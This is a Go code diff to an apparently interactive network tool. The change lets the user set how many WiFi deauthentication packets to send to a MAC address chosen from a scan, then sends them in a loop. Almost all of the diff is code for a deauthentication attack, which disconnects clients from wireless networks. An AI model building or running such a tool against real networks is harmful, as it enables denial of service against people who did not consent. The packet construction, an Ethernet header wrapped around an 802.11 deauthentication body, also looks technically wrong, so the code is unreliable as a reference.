@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strconv"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -72,7 +73,12 @@ func InterfaceMenu(iface net.Interface) {
 			listMac = scanPkg(iface)
 		case "deauth":
 			mac := selectMac(listMac)
-			sendDeauth(iface, mac)
+			npacket, err := strconv.Atoi(userIO.Prompt(color.ColorPrint("red", "number of packets ") + "=> "))
+			if err != nil {
+				fmt.Println("err :", err)
+			} else {
+				sendDeauth(iface, mac, npacket)
+			}
 		case "exit":
 			return
 		}
@@ -173,7 +179,7 @@ func selectMac(listMac []string) net.HardwareAddr {
 	return macAddr
 }
 
-func sendDeauth(iface net.Interface, mac net.HardwareAddr) {
+func sendDeauth(iface net.Interface, mac net.HardwareAddr, npacket int) {
 	handle, err := pcap.OpenLive(iface.Name, 1600, true, pcap.BlockForever)
 	if err != nil {
 		fmt.Println("err :", err)
@@ -181,7 +187,9 @@ func sendDeauth(iface net.Interface, mac net.HardwareAddr) {
 	}
 	defer handle.Close()
 	fmt.Println("sending deauth to", mac)
-	sendDeauthPkg(handle, mac)
+	for i := 0; i < npacket; i++ {
+		sendDeauthPkg(handle, mac)
+	}
 }
 
 func sendDeauthPkg(handle *pcap.Handle, mac net.HardwareAddr) {
@@ -195,8 +203,20 @@ func sendDeauthPkg(handle *pcap.Handle, mac net.HardwareAddr) {
 		DstMAC:       mac,
 		EthernetType: layers.EthernetTypeDot1Q,
 	}
-	gopacket.SerializeLayers(buf, opts, &eth)
-	handle.WritePacketData(buf.Bytes())
+	deauth := layers.Dot11MgmtDeauthentication{
+		Dot11Mgmt: layers.Dot11Mgmt{
+			BaseLayer: layers.BaseLayer{
+				Contents: []byte{},
+				Payload:  []byte{},
+			},
+		},
+		Reason: 1,
+	}
+	gopacket.SerializeLayers(buf, opts, &eth, &deauth)
+	err := handle.WritePacketData(buf.Bytes())
+	if err != nil {
+		fmt.Println("err :", err)
+	}
 }
 
 func show(iface net.Interface) {
